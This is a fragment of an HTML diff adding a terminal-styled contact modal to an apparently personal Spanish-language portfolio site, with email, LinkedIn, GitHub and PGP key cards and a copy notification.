+          <svg viewBox="0 0 24 24">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+
+        <div class="modal-header">
+          <div class="terminal-prompt">
+            <span class="prompt-symbol">$</span>
+            <span class="prompt-text">establishing_secure_connection...</span>
+            <span class="cursor-blink">_</span>
+          </div>
+          <h2>Canales de Comunicación Seguros</h2>
+          <p>Selecciona tu método preferido de contacto</p>
+        </div>
+
+        <div class="contact-channels">
+          <!-- Email Channel -->
+          <a href="mailto:n30xx7@gmail.com" class="channel-card">
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"
+                ></path>
+                <polyline points="22,6 12,13 2,6"></polyline>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[ENCRYPTED EMAIL]</h3>
+              <p class="channel-value">n30xx7@gmail.com</p>
+              <span class="channel-status">Respuesta en 24-48h</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- LinkedIn Channel -->
+          <a
+            href="https://www.linkedin.com/in/ne0xx-18a9152a7"
+            target="_blank"
+            class="channel-card"
+          >
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"
+                ></path>
+                <rect x="2" y="9" width="4" height="12"></rect>
+                <circle cx="4" cy="4" r="2"></circle>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[PROFESSIONAL NETWORK]</h3>
+              <p class="channel-value">LinkedIn Profile</p>
+              <span class="channel-status">Networking & Colaboración</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- GitHub Channel -->
+          <a
+            href="https://github.com/Ne0X-Z"
+            target="_blank"
+            class="channel-card"
+          >
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"
+                ></path>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[CODE REPOSITORY]</h3>
+              <p class="channel-value">github.com/Ne0X-Z</p>
+              <span class="channel-status">Proyectos & Colaboración</span>
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </div>
+          </a>
+
+          <!-- PGP Key -->
+          <div class="channel-card pgp-card">
+            <div class="channel-icon">
+              <svg viewBox="0 0 24 24">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+            </div>
+            <div class="channel-info">
+              <h3>[PGP PUBLIC KEY]</h3>
+              <p class="channel-value">Comunicación cifrada disponible</p>
+              <span class="channel-status"
+                >Click para copiar la clave pública</span
+              >
+            </div>
+            <div class="channel-arrow">
+              <svg viewBox="0 0 24 24">
+                <polyline points="6 9 12 15 18 9"></polyline>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <div class="modal-footer">
+          <div class="security-notice">
+            <svg viewBox="0 0 24 24">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+            <span
+              >Todas las comunicaciones son tratadas con confidencialidad</span
+            >
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Notification Toast -->
+    <div id="notification" class="notification">
+      <div class="notification-content">
+        <svg class="notification-icon" viewBox="0 0 24 24">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+        <span class="notification-text">Texto copiado</span>
+      </div>
+    </div>
+
+    <script src="../js/card-effects.js"></script>
+    <script src="../js/contact-modal.js"></script>
+  </body>
+</html>
